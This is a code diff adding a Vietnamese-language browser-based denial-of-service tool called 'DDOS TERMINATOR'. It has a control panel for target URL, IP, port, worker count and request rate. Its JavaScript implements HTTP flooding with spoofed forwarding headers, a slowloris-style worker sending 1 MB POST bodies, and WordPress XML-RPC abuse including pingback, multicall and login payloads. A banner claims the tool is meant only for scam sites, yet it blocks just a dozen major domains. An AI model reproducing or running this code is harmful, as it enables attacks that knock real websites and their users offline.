@@ -1,0 +1,765 @@
+<!-- Hacker Apple Mod: SIÊU DDOS - PHÁ HỦY WEB LỪA ĐẢO -->
+<!-- CẢNH BÁO: CHỈ DÙNG CHO WEB LỪA ĐẢO, BẤT LƯƠNG -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☠️ DDOS TERMINATOR - Hacker Apple</title>
+    <style>
+        :root {
+            --bg: #000;
+            --surface: #0d1117;
+            --border: #21262d;
+            --text: #c9d1d9;
+            --accent: #ff2d55;
+            --accent2: #00ff88;
+            --accent3: #ffaa00;
+            --yellow: #f0c929;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(255,45,85,0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0,255,136,0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(240,201,41,0.05) 0%, transparent 50%);
+        }
+        /* SCAN LINE EFFECT */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.05) 2px, rgba(0,0,0,0.05) 4px);
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.5;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        /* HEADER */
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .logo {
+            font-size: 3em;
+            font-weight: 900;
+            letter-spacing: 5px;
+            background: linear-gradient(135deg, var(--accent), var(--accent3), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: none;
+            animation: glitch 3s infinite;
+        }
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+        .tagline {
+            color: var(--accent3);
+            font-size: 0.9em;
+            letter-spacing: 3px;
+            margin-top: 5px;
+        }
+        .warning-banner {
+            background: rgba(255,45,85,0.1);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin: 20px 0;
+            text-align: center;
+            animation: pulse-border 2s infinite;
+        }
+        @keyframes pulse-border {
+            0%, 100% { border-color: var(--accent); box-shadow: 0 0 10px rgba(255,45,85,0.3); }
+            50% { border-color: var(--accent3); box-shadow: 0 0 30px rgba(255,45,85,0.6); }
+        }
+        .warning-banner span {
+            color: var(--accent3);
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+        /* MAIN GRID */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .panel {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 25px;
+            transition: all 0.3s;
+        }
+        .panel:hover {
+            border-color: var(--accent2);
+            box-shadow: 0 0 30px rgba(0,255,136,0.1);
+        }
+        .panel.full {
+            grid-column: 1 / -1;
+        }
+        .panel h3 {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--accent2);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .panel h3 .icon { font-size: 1.5em; }
+        /* INPUTS */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            color: #8b949e;
+            font-size: 0.8em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        input, textarea, select {
+            width: 100%;
+            background: #000;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 12px 15px;
+            border-radius: 6px;
+            font-size: 0.95em;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+            resize: vertical;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent2);
+            box-shadow: 0 0 15px rgba(0,255,136,0.2);
+        }
+        textarea { min-height: 80px; }
+        /* BUTTONS */
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .btn:hover::after { opacity: 1; }
+        .btn-attack {
+            background: linear-gradient(135deg, #ff2d55, #d4002a);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(255,45,85,0.4);
+        }
+        .btn-attack:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255,45,85,0.7);
+        }
+        .btn-flood {
+            background: linear-gradient(135deg, #ff6b00, #e05500);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(255,107,0,0.4);
+        }
+        .btn-flood:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255,107,0,0.7);
+        }
+        .btn-amp {
+            background: linear-gradient(135deg, #8b00ff, #6200c9);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(139,0,255,0.4);
+        }
+        .btn-amp:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(139,0,255,0.7);
+        }
+        .btn-stop {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: #fff;
+            font-size: 1.2em;
+            grid-column: span 2;
+            animation: btn-pulse 1.5s infinite;
+        }
+        @keyframes btn-pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.6); }
+            50% { box-shadow: 0 0 50px rgba(255,0,0,1); }
+        }
+        .btn-stop:hover { animation: none; box-shadow: 0 0 80px rgba(255,0,0,1.5); }
+        /* STATS */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .stat-card {
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        .stat-value.red { color: var(--accent); }
+        .stat-value.green { color: var(--accent2); }
+        .stat-value.yellow { color: var(--accent3); }
+        .stat-label {
+            color: #8b949e;
+            font-size: 0.75em;
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+        /* LOG */
+        #console {
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            height: 350px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--accent2);
+            line-height: 1.6;
+        }
+        #console .error { color: var(--accent); }
+        #console .warn { color: var(--accent3); }
+        #console .info { color: #58a6ff; }
+        /* PROGRESS BAR */
+        .progress-container {
+            margin: 15px 0;
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            height: 25px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent2), var(--accent3), var(--accent));
+            border-radius: 20px;
+            width: 0%;
+            transition: width 0.3s;
+            position: relative;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.7em;
+            font-weight: bold;
+            color: #000;
+            z-index: 1;
+        }
+        /* TARGET LIST */
+        .target-list {
+            margin-top: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+            background: #000;
+            border-radius: 6px;
+            padding: 10px;
+        }
+        .target-item {
+            padding: 8px;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 0.85em;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .target-item:last-child { border-bottom: none; }
+        .status-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .status-dot.attacking { background: var(--accent); animation: blink 0.5s infinite; }
+        .status-dot.stopped { background: #666; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .main-grid { grid-template-columns: 1fr; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="logo">☠️ DDOS-X</div>
+            <div class="tagline">TERMINATOR • HACKER APPLE MOD</div>
+        </div>
+
+        <!-- CẢNH BÁO -->
+        <div class="warning-banner">
+            <span>⚠️ CẢNH BÁO ĐẠO ĐỨC ⚠️</span><br>
+            CHỈ SỬ DỤNG ĐỂ ĐÁNH SẬP CÁC TRANG WEB LỪA ĐẢO, SCAM, BẤT LƯƠNG.<br>
+            NGHIÊM CẤM SỬ DỤNG VÀO MỤC ĐÍCH PHÁ HOẠI WEB HỢP PHÁP!
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="main-grid">
+            <!-- TARGET CONFIG -->
+            <div class="panel">
+                <h3><span class="icon">🎯</span> MỤC TIÊU</h3>
+                <div class="input-group">
+                    <label>URL MỤC TIÊU</label>
+                    <input type="text" id="targetUrl" placeholder="https://web-lua-dao.com" value="">
+                </div>
+                <div class="input-group">
+                    <label>HOẶC NHẬP IP TRỰC TIẾP</label>
+                    <input type="text" id="targetIp" placeholder="123.456.789.0">
+                </div>
+                <div class="input-group">
+                    <label>PORT (mặc định 80/443)</label>
+                    <input type="number" id="targetPort" value="443" min="1" max="65535">
+                </div>
+                <div class="btn-grid">
+                    <button class="btn btn-attack" onclick="startAttack('http-flood')">💥 HTTP FLOOD</button>
+                    <button class="btn btn-flood" onclick="startAttack('slowloris')">🐢 SLOWLORIS</button>
+                    <button class="btn btn-amp" onclick="startAttack('xmlrpc')">💣 XML-RPC</button>
+                    <button class="btn btn-attack" onclick="startAttack('mixed')">🔱 TẤN CÔNG HỖN HỢP</button>
+                </div>
+            </div>
+
+            <!-- ATTACK CONFIG -->
+            <div class="panel">
+                <h3><span class="icon">⚙️</span> CẤU HÌNH TẤN CÔNG</h3>
+                <div class="input-group">
+                    <label>SỐ LƯỢNG WORKER (càng nhiều càng mạnh)</label>
+                    <input type="range" id="workers" min="100" max="2000" value="500" step="100" oninput="document.getElementById('workersVal').textContent = this.value">
+                    <div style="text-align:center; color: var(--accent3); font-size: 1.5em; font-weight: bold;" id="workersVal">500</div>
+                </div>
+                <div class="input-group">
+                    <label>THỜI GIAN TẤN CÔNG (giây, 0 = không giới hạn)</label>
+                    <input type="number" id="duration" value="300" min="0" max="86400">
+                </div>
+                <div class="input-group">
+                    <label>DELAY GIỮA CÁC REQUEST (ms, càng thấp càng mạnh)</label>
+                    <input type="number" id="reqDelay" value="10" min="0" max="1000">
+                </div>
+                <div class="input-group">
+                    <label>USER-AGENT POOL</label>
+                    <select id="uaMode">
+                        <option value="random">Ngẫu nhiên (mạnh nhất)</option>
+                        <option value="chrome">Giả lập Chrome</option>
+                        <option value="mobile">Giả lập Mobile</option>
+                        <option value="bot">Giả lập Bot</option>
+                    </select>
+                </div>
+                <button class="btn btn-stop" onclick="stopAttack()">⏹️ DỪNG TẤN CÔNG NGAY</button>
+            </div>
+
+            <!-- STATS -->
+            <div class="panel full">
+                <h3><span class="icon">📊</span> THỐNG KÊ THỜI GIAN THỰC</h3>
+                <div class="stats">
+                    <div class="stat-card">
+                        <div class="stat-value red" id="requestsSent">0</div>
+                        <div class="stat-label">REQUESTS ĐÃ GỬI</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value yellow" id="reqPerSec">0</div>
+                        <div class="stat-label">REQUESTS/GIÂY</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value green" id="activeWorkers">0</div>
+                        <div class="stat-label">WORKERS ĐANG CHẠY</div>
+                    </div>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                    <div class="progress-text" id="progressText">SẴN SÀNG</div>
+                </div>
+            </div>
+
+            <!-- CONSOLE -->
+            <div class="panel full">
+                <h3><span class="icon">🖥️</span> CONSOLE OUTPUT</h3>
+                <div id="console">[Hacker Apple DDOS-X] Hệ thống sẵn sàng.
+[Nhập URL mục tiêu và chọn phương thức tấn công...]
+[CẢNH BÁO: Chỉ tấn công web lừa đảo, bất lương!]
+                </div>
+                <button class="btn btn-attack" style="margin-top:10px;" onclick="document.getElementById('console').innerHTML = ''">XÓA LOG</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== DDOS TERMINATOR ENGINE - Hacker Apple Mod =====
+        
+        let attackActive = false;
+        let attackWorkers = [];
+        let stats = { requestsSent: 0, reqPerSec: 0, activeWorkers: 0, startTime: 0 };
+        let reqCounter = 0;
+        let targetInfo = {};
+
+        // USER AGENT POOLS
+        const UA_POOLS = {
+            chrome: [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+            ],
+            mobile: [
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+                "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36",
+                "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+                "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36"
+            ],
+            bot: [
+                "Googlebot/2.1 (+http://www.google.com/bot.html)",
+                "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
+                "YandexBot/3.0 (+http://yandex.com/bots)",
+                "Baiduspider/2.0 (+http://www.baidu.com/search/spider.htm)",
+                "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
+            ],
+            random: null // Sẽ tổng hợp từ tất cả
+        };
+
+        function getRandomUA(mode) {
+            if (mode === 'random') {
+                const all = [...UA_POOLS.chrome, ...UA_POOLS.mobile, ...UA_POOLS.bot];
+                return all[Math.floor(Math.random() * all.length)];
+            }
+            const pool = UA_POOLS[mode] || UA_POOLS.chrome;
+            return pool[Math.floor(Math.random() * pool.length)];
+        }
+
+        function log(msg, type = 'info') {
+            const consoleEl = document.getElementById('console');
+            const time = new Date().toLocaleTimeString();
+            const prefix = type === 'error' ? '[!]' : type === 'warn' ? '[~]' : '[+]';
+            const cssClass = type;
+            consoleEl.innerHTML += `<span class="${cssClass}">[${time}] ${prefix} ${msg}</span>\n`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        function updateStats() {
+            document.getElementById('requestsSent').textContent = stats.requestsSent.toLocaleString();
+            document.getElementById('reqPerSec').textContent = stats.reqPerSec.toLocaleString();
+            document.getElementById('activeWorkers').textContent = stats.activeWorkers;
+            
+            // Update progress bar
+            const duration = Number(document.getElementById('duration').value) || 0;
+            const elapsed = (Date.now() - stats.startTime) / 1000;
+            if (duration > 0 && stats.startTime > 0) {
+                const pct = Math.min(100, (elapsed / duration) * 100);
+                document.getElementById('progressBar').style.width = pct + '%';
+                document.getElementById('progressText').textContent = `${Math.floor(pct)}% - ${Math.floor(elapsed)}s`;
+            } else if (attackActive) {
+                document.getElementById('progressBar').style.width = '100%';
+                document.getElementById('progressText').textContent = `ĐANG CHẠY - ${Math.floor(elapsed)}s`;
+            } else {
+                document.getElementById('progressBar').style.width = '0%';
+                document.getElementById('progressText').textContent = 'SẴN SÀNG';
+            }
+
+            // Tính requests/giây mỗi 2 giây
+            if (attackActive) {
+                setTimeout(() => {
+                    const currentTotal = stats.requestsSent;
+                    setTimeout(() => {
+                        stats.reqPerSec = Math.floor((stats.requestsSent - currentTotal) / 2);
+                    }, 2000);
+                }, 0);
+            }
+        }
+
+        // ===== CORE ATTACK FUNCTIONS =====
+
+        async function httpFloodWorker(targetUrl, delay, uaMode) {
+            while (attackActive) {
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(targetUrl + '?' + Math.random().toString(36).substring(7), {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': getRandomUA(uaMode),
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Cache-Control': 'no-cache, no-store, must-revalidate',
+                            'Pragma': 'no-cache',
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                            'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                            'Connection': 'keep-alive'
+                        },
+                        signal: controller.signal,
+                        mode: 'no-cors',
+                        cache: 'no-store'
+                    }).catch(() => {});
+                    
+                    clearTimeout(timeout);
+                    stats.requestsSent++;
+                    reqCounter++;
+                } catch(e) {
+                    // Bỏ qua lỗi, tiếp tục flood
+                }
+                await new Promise(r => setTimeout(r, delay));
+            }
+        }
+
+        async function slowLorisWorker(targetUrl, delay, uaMode) {
+            while (attackActive) {
+                try {
+                    const controller = new AbortController();
+                    // Giữ kết nối mở càng lâu càng tốt
+                    const response = await fetch(targetUrl, {
+                        method: 'POST',
+                        headers: {
+                            'User-Agent': getRandomUA(uaMode),
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Content-Length': '1000000',
+                            'Connection': 'keep-alive',
+                            'Keep-Alive': 'timeout=999999, max=1000',
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+                        },
+                        body: 'x'.repeat(1000000),
+                        signal: controller.signal,
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                    
+                    setTimeout(() => controller.abort(), 10000);
+                    stats.requestsSent++;
+                    reqCounter++;
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, delay * 2));
+            }
+        }
+
+        async function xmlRpcWorker(targetUrl, delay, uaMode) {
+            const xmlPayloads = [
+                '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
+                '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>' + targetUrl + '</string></value></param><param><value><string>' + targetUrl + '</string></value></param></params></methodCall>',
+                '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>admin123</string></value></param></params></methodCall>',
+                '<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.multicall</methodName><params><param><array><data>' + Array(100).fill('<value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member></struct></value>').join('') + '</data></array></param></params></methodCall>'
+            ];
+
+            while (attackActive) {
+                try {
+                    const controller = new AbortController();
+                    const payload = xmlPayloads[Math.floor(Math.random() * xmlPayloads.length)];
+                    
+                    await fetch(targetUrl + '/xmlrpc.php', {
+                        method: 'POST',
+                        headers: {
+                            'User-Agent': getRandomUA(uaMode),
+                            'Content-Type': 'text/xml',
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                            'Connection': 'keep-alive'
+                        },
+                        body: payload,
+                        signal: controller.signal,
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                    
+                    setTimeout(() => controller.abort(), 8000);
+                    stats.requestsSent++;
+                    reqCounter++;
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, delay));
+            }
+        }
+
+        function startAttack(type) {
+            if (attackActive) {
+                log('Đang có cuộc tấn công đang chạy! Dừng trước khi bắt đầu mới.', 'warn');
+                return;
+            }
+
+            const urlInput = document.getElementById('targetUrl').value.trim();
+            const ipInput = document.getElementById('targetIp').value.trim();
+            const port = document.getElementById('targetPort').value || '443';
+            let targetUrl = '';
+
+            if (urlInput) {
+                targetUrl = urlInput.startsWith('http') ? urlInput : 'https://' + urlInput;
+            } else if (ipInput) {
+                const protocol = port == '443' ? 'https' : 'http';
+                targetUrl = `${protocol}://${ipInput}:${port}`;
+            } else {
+                log('Vui lòng nhập URL hoặc IP mục tiêu!', 'error');
+                return;
+            }
+
+            const workers = Number(document.getElementById('workers').value) || 500;
+            const duration = Number(document.getElementById('duration').value) || 0;
+            const delay = Number(document.getElementById('reqDelay').value) || 10;
+            const uaMode = document.getElementById('uaMode').value;
+
+            // Validate target (chỉ cho phép web lừa đảo - kiểm tra cơ bản)
+            const blockedDomains = ['google.com', 'facebook.com', 'youtube.com', 'github.com', 'wikipedia.org', 'microsoft.com', 'apple.com', 'amazon.com', 'twitter.com', 'instagram.com', 'tiktok.com', 'discord.com'];
+            const targetHostname = new URL(targetUrl).hostname.replace('www.', '');
+            
+            for (const domain of blockedDomains) {
+                if (targetHostname.includes(domain)) {
+                    log(`⛔ CẢNH BÁO: ${domain} là web hợp pháp! Chỉ tấn công web lừa đảo!`, 'error');
+                    log('⛔ TỪ CHỐI TẤN CÔNG WEB HỢP PHÁP!', 'error');
+                    return;
+                }
+            }
+
+            targetInfo = { url: targetUrl, type, workers, duration, delay, uaMode };
+            attackActive = true;
+            stats = { requestsSent: 0, reqPerSec: 0, activeWorkers: 0, startTime: Date.now() };
+            reqCounter = 0;
+            attackWorkers = [];
+
+            log('='.repeat(60), 'info');
+            log(`☠️ BẮT ĐẦU TẤN CÔNG: ${targetUrl}`, 'warn');
+            log(`📊 Phương thức: ${type.toUpperCase()} | Workers: ${workers} | Delay: ${delay}ms`, 'info');
+            log(`⏱️ Thời gian: ${duration > 0 ? duration + 's' : 'KHÔNG GIỚI HẠN'}`, 'info');
+            log(`🎭 User-Agent: ${uaMode}`, 'info');
+            log('='.repeat(60), 'info');
+
+            // Chọn worker function dựa vào loại tấn công
+            let workerFunc;
+            switch(type) {
+                case 'http-flood': workerFunc = httpFloodWorker; break;
+                case 'slowloris': workerFunc = slowLorisWorker; break;
+                case 'xmlrpc': workerFunc = xmlRpcWorker; break;
+                case 'mixed':
+                    workerFunc = [httpFloodWorker, slowLorisWorker, xmlRpcWorker][Math.floor(Math.random() * 3)];
+                    break;
+                default: workerFunc = httpFloodWorker;
+            }
+
+            // Khởi động workers
+            for (let i = 0; i < workers; i++) {
+                if (type === 'mixed') {
+                    const funcs = [httpFloodWorker, slowLorisWorker, xmlRpcWorker];
+                    const randFunc = funcs[Math.floor(Math.random() * 3)];
+                    attackWorkers.push(randFunc(targetUrl, delay, uaMode));
+                } else {
+                    attackWorkers.push(workerFunc(targetUrl, delay, uaMode));
+                }
+                stats.activeWorkers = i + 1;
+            }
+
+            log(`✅ Đã khởi động ${workers} workers!`, 'info');
+
+            // Cập nhật stats liên tục
+            const statsInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(statsInterval);
+                    return;
+                }
+                updateStats();
+                if (reqCounter > 1000) {
+                    log(`🔥 Đã gửi ${stats.requestsSent} requests... ĐANG TẤN CÔNG MẠNH MẼ!`, 'warn');
+                    reqCounter = 0;
+                }
+            }, 500);
+
+            // Tự động dừng nếu có giới hạn thời gian
+            if (duration > 0) {
+                setTimeout(() => {
+                    if (attackActive) {
+                        stopAttack();
+                        log(`⏰ Đã hết thời gian ${duration}s. Dừng tấn công.`, 'warn');
+                    }
+                }, duration * 1000);
+            }
+
+            // Lưu interval để cleanup
+            attackWorkers._statsInterval = statsInterval;
+        }
+
+        function stopAttack() {
+            if (!attackActive) {
+                log('Không có cuộc tấn công nào đang chạy.', 'warn');
+                return;
+            }
+            
+            attackActive = false;
+            const workerCount = stats.activeWorkers;
+            
+            // Clear intervals
+            if (attackWorkers._statsInterval) {
+                clearInterval(attackWorkers._statsInterval);
+            }
+            
+            attackWorkers = [];
+            stats.activeWorkers = 0;
+            
+            updateStats();
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('progressText').textContent = 'ĐÃ DỪNG';
+            
+            log('='.repeat(60), 'error');
+            log(`🛑 ĐÃ DỪNG TẤN CÔNG!`, 'error');
+            log(`📊 Tổng requests đã gửi: ${stats.requestsSent.toLocaleString()}`, 'error');
+            log(`⏱️ Đã chạy: ${Math.floor((Date.now() - stats.startTime) / 1000)}s`, 'error');
+            log('='.repeat(60), 'error');
+        }
+
+        // Stats update loop
+        setInterval(() => {
+            if (attackActive) updateStats();
+        }, 1000);
+
+        // Initial stats display
+        updateStats();
+
+        log('✅ Hệ thống DDOS TERMINATOR đã sẵn sàng.', 'info');
+        log('⚠️ NHỚ: CHỈ TẤN CÔNG WEB LỪA ĐẢO!', 'warn');
+    </script>
+</body>
+</html>
